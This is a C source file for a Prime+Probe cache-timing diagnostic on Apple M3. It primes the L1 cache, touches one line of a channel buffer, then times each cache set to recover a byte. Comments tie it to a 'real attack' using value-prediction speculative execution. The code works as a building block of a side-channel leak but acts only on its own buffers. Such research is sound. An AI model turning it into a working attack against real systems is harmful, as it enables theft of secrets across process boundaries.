/*
 * pp-diag.c — Prime+Probe diagnostic for Apple M3
 *
 * Tests whether L1 Prime+Probe can detect a single cache line access.
 * Primes all L1 sets, accesses a known channel line, then probes to see
 * which set was disturbed.
 *
 * Key question: is the timing gap between an evicted prime line (L2 hit ~15 cyc)
 * and an in-place prime line (L1 hit ~5 cyc) large enough to detect?
 *
 * Build: gcc -O3 -o pp-diag pp-diag.c
 * Run:   sudo ./pp-diag
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <time.h>

#define PAGE_SZ       16384
#define CACHE_LINE_SZ 128

/* L1D cache geometry (Apple M3 P-core, assumed) */
#define L1_WAYS       8
#define L1_SETS       128
#define L1_LINE_SIZE  CACHE_LINE_SZ
#define L1_SET_STRIDE (L1_SETS * L1_LINE_SIZE)   /* 16384 — one full rotation through all sets */
#define L1_SIZE       (L1_WAYS * L1_SET_STRIDE)  /* 131072 = 128 KB */

/* Optional L2 priming to force L1 evictions to SLC instead of L2. */
/* Set to 0 to disable L2 priming, or ~16 MB to enable. */
#define L2_PRIME_SIZE (16UL * 1024 * 1024)

inline __attribute__((always_inline)) void clflush(void *ptr)
{
    asm volatile("dc civac, %0" : : "r"(ptr) : "memory");
}

inline __attribute__((always_inline)) uint64_t rdtsc()
{
    uint64_t ts;
    asm volatile("dsb ish");
    asm volatile("isb");
    asm volatile("mrs %0, S3_2_c15_c0_0" : "=r"(ts) : :);
    asm volatile("isb");
    return ts;
}

int main(int argc, char *argv[])
{
    srand(time(NULL));

    /* Pin to P-core 5 */
    uint32_t CORE_ID = 5;
    if (sysctlbyname("kern.sched_thread_bind_cpu", NULL, NULL, &CORE_ID, sizeof(uint32_t)) == -1)
    {
        printf("Error setting CPU core affinity. Please run as root\n");
        return 1;
    }

    /* Channel: 128 cache lines (one per L1 set for byte values 0-127).
     * We use CACHE_LINE_SZ stride instead of PAGE_SZ. */
    void *channel = mmap(NULL, 128 * CACHE_LINE_SZ, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (channel == MAP_FAILED) { perror("mmap channel"); return 1; }
    memset(channel, 0x99, 128 * CACHE_LINE_SZ);

    /* Prime buffer: fills entire L1 (128 KB).
     * prime_buf[way * L1_SET_STRIDE + set * CACHE_LINE_SZ] maps to L1 set 'set'
     * (because mmap returns 16 KB-aligned addresses on Apple Silicon). */
    void *prime_buf = mmap(NULL, L1_SIZE, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (prime_buf == MAP_FAILED) { perror("mmap prime"); return 1; }
    memset(prime_buf, 0x55, L1_SIZE);

    /* L2 prime buffer (optional — to push evicted L1 lines past L2 to SLC). */
    void *l2_buf = NULL;
    if (L2_PRIME_SIZE > 0)
    {
        l2_buf = mmap(NULL, L2_PRIME_SIZE, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (l2_buf == MAP_FAILED) { perror("mmap l2"); return 1; }
        memset(l2_buf, 0xBB, L2_PRIME_SIZE);
    }

    printf("=== Prime+Probe Diagnostic ===\n");
    printf("L1: %d sets x %d ways x %d B = %d KB\n",
           L1_SETS, L1_WAYS, L1_LINE_SIZE, L1_SIZE / 1024);
    printf("Channel base set: %d\n",
           (int)(((uintptr_t)channel >> 7) & 0x7F));
    printf("Prime base set:   %d\n",
           (int)(((uintptr_t)prime_buf >> 7) & 0x7F));
    printf("L2 priming: %s (%lu MB)\n\n",
           L2_PRIME_SIZE > 0 ? "ON" : "OFF", L2_PRIME_SIZE / (1024 * 1024));

    int channel_base = ((uintptr_t)channel >> 7) & 0x7F;

    /* Test: access channel line for known byte value, see if probe detects it. */
    int test_vals[] = {77, 114, 32, 97, 100, 65};  /* 'M', 'r', ' ', 'a', 'd', 'A' */
    int n_tests = sizeof(test_vals) / sizeof(test_vals[0]);

    for (int t = 0; t < n_tests; t++)
    {
        int target_byte = test_vals[t];
        int target_set = (channel_base + target_byte) & 0x7F;
        printf("--- Test: byte=%d ('%c'), expected set=%d ---\n",
               target_byte, target_byte, target_set);

        /* Repeat multiple times to check consistency. */
        int correct = 0;
        int total = 20;
        for (int rep = 0; rep < total; rep++)
        {
            /* 1. Flush channel from L1 (dc civac → SLC on M3 Max). */
            for (int i = 0; i < 128; i++)
                clflush((void *)((char *)channel + i * CACHE_LINE_SZ));
            asm volatile("dsb ish");
            asm volatile("isb");

            /* 2. Optionally prime L2 to fill it, so L1 evictions go to SLC. */
            if (l2_buf)
            {
                for (size_t off = 0; off < L2_PRIME_SIZE; off += CACHE_LINE_SZ)
                    (void)(*(volatile char *)((char *)l2_buf + off));
                asm volatile("dsb ish");
                asm volatile("isb");
            }

            /* 3. Prime L1: fill all sets with prime buffer data. */
            for (int w = 0; w < L1_WAYS; w++)
                for (int s = 0; s < L1_SETS; s++)
                    (void)(*(volatile char *)((char *)prime_buf + w * L1_SET_STRIDE + s * CACHE_LINE_SZ));
            asm volatile("dsb ish");
            asm volatile("isb");

            /* 4. Simulate speculative access: touch one channel line.
             * (In the real attack, this would be done by the LVP-mispredicted
             *  speculative execution path.) */
            (void)(*(volatile char *)((char *)channel + target_byte * CACHE_LINE_SZ));

            /* 5. Probe: measure total access time per set (all 8 ways). */
            uint64_t set_times[L1_SETS];
            for (int s = 0; s < L1_SETS; s++)
            {
                uint64_t t0 = rdtsc();
                for (int w = 0; w < L1_WAYS; w++)
                    (void)(*(volatile char *)((char *)prime_buf + w * L1_SET_STRIDE + s * CACHE_LINE_SZ));
                uint64_t t1 = rdtsc();
                set_times[s] = t1 - t0;
            }

            /* 6. Find the set with the highest probe time. */
            int max_set = -1;
            uint64_t max_time = 0;
            for (int s = 0; s < L1_SETS; s++)
            {
                if (set_times[s] > max_time)
                {
                    max_time = set_times[s];
                    max_set = s;
                }
            }

            int detected_byte = (max_set - channel_base + L1_SETS) & 0x7F;
            if (detected_byte == target_byte)
                correct++;

            /* Print first few reps for debugging. */
            if (rep < 3)
            {
                printf("  rep %d: max_set=%d (time=%llu), detected='%c' (%d) %s\n",
                       rep, max_set, max_time, detected_byte >= 32 ? detected_byte : '?',
                       detected_byte,
                       detected_byte == target_byte ? "CORRECT" : "wrong");
                printf("         target_set time=%llu, noise avg=",
                       set_times[target_set]);
                /* Compute average of non-target sets for comparison. */
                uint64_t noise_sum = 0;
                for (int s = 0; s < L1_SETS; s++)
                    if (s != target_set)
                        noise_sum += set_times[s];
                printf("%llu\n", noise_sum / (L1_SETS - 1));
            }
        }
        printf("  Accuracy: %d/%d = %.0f%%\n\n", correct, total,
               100.0 * correct / total);
    }

    /* Also print a full histogram for one test to visualize the signal. */
    printf("=== Full histogram for byte='M' (77), set=%d ===\n",
           (channel_base + 77) & 0x7F);
    {
        int target_set = (channel_base + 77) & 0x7F;

        for (int i = 0; i < 128; i++)
            clflush((void *)((char *)channel + i * CACHE_LINE_SZ));
        asm volatile("dsb ish");
        asm volatile("isb");

        if (l2_buf)
        {
            for (size_t off = 0; off < L2_PRIME_SIZE; off += CACHE_LINE_SZ)
                (void)(*(volatile char *)((char *)l2_buf + off));
            asm volatile("dsb ish");
            asm volatile("isb");
        }

        for (int w = 0; w < L1_WAYS; w++)
            for (int s = 0; s < L1_SETS; s++)
                (void)(*(volatile char *)((char *)prime_buf + w * L1_SET_STRIDE + s * CACHE_LINE_SZ));
        asm volatile("dsb ish");
        asm volatile("isb");

        (void)(*(volatile char *)((char *)channel + 77 * CACHE_LINE_SZ));

        uint64_t set_times[L1_SETS];
        for (int s = 0; s < L1_SETS; s++)
        {
            uint64_t t0 = rdtsc();
            for (int w = 0; w < L1_WAYS; w++)
                (void)(*(volatile char *)((char *)prime_buf + w * L1_SET_STRIDE + s * CACHE_LINE_SZ));
            uint64_t t1 = rdtsc();
            set_times[s] = t1 - t0;
        }

        for (int s = 0; s < L1_SETS; s++)
        {
            printf("  set[%3d] = %4llu cyc %s\n", s, set_times[s],
                   s == target_set ? " <-- TARGET" : "");
        }
    }

    munmap(channel, 128 * CACHE_LINE_SZ);
    munmap(prime_buf, L1_SIZE);
    if (l2_buf) munmap(l2_buf, L2_PRIME_SIZE);

    return 0;
}
